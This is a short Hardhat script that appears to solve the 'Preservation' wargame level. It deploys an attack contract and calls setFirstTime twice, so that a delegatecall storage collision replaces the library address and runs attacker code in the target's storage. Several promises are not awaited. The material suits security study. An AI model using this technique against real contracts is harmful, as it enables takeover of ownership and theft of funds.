// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";

async function main() {
  const [player] = await ethers.getSigners();

  // get preservation contract
  const preservation = await ethers.getContractAt("Preservation", "0xc1Fad4718543D945292e474dDa321EBAc699DAE5")

  // deploy attack contract
  const Attack = await ethers.getContractFactory("Attack")
  const attack = await Attack.connect(player).deploy()
  attack.deployed()

  // change the library target
  const setFirstTimeTx = await preservation.setFirstTime(attack.address, {
    gasLimit: 1000000
  })
  setFirstTimeTx.wait(4)

  // attack 
  const attackTx = await preservation.connect(player).setFirstTime(attack.address, {
    gasLimit: 1000000
  })
  attackTx.wait(4)

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
